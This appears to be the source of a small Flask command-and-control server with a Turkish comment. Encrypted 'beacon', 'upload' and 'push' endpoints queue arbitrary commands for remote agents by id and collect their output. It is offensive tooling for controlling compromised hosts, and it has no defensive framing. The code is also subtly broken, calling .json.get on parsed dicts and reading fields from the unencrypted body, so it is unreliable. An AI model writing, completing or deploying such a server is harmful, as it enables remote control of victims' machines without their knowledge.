import json

from flask import Flask, request , jsonify
import Encryption
from Encryption import decrypt_data

app = Flask(__name__)

tasks = {}

@app.route('/api/status', methods = ['POST'])
def beacon():
    #json verisi şifreli geliyor
    encrypted = request.json.get('data')
    decrypted_json = decrypt_data(encrypted)
    beacon_info = json.loads(decrypted_json)


    agent_id = beacon_info.json.get('id')
    if agent_id in tasks and tasks[agent_id]:
        task = tasks[agent_id].pop(0)
        return jsonify({"task": task})
    else:
        return jsonify({"task": None})

@app.route('/api/upload', methods= ['POST'])
def result():
    encrypted = request.json.get('data')
    decrypted_json = decrypt_data(encrypted)
    result_info = json.loads(decrypted_json)


    agent_id = result_info.json.get('id')
    output = request.json.get('output')
    print(f"[+] Result from {agent_id}: {output}")
    return jsonify({"status": "received"})

@app.route('/api/push', methods = ['POST'])
def task():
    encrypted = request.json.get('data')
    decrypted_json = decrypt_data(encrypted)
    task_info = json.loads(decrypted_json)

    agent_id = task_info.json.get('id')
    command=request.json.get('command')
    if agent_id not in tasks:
        tasks[agent_id]= []
    tasks[agent_id].append(command)
    return jsonify({"status":"task queued"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)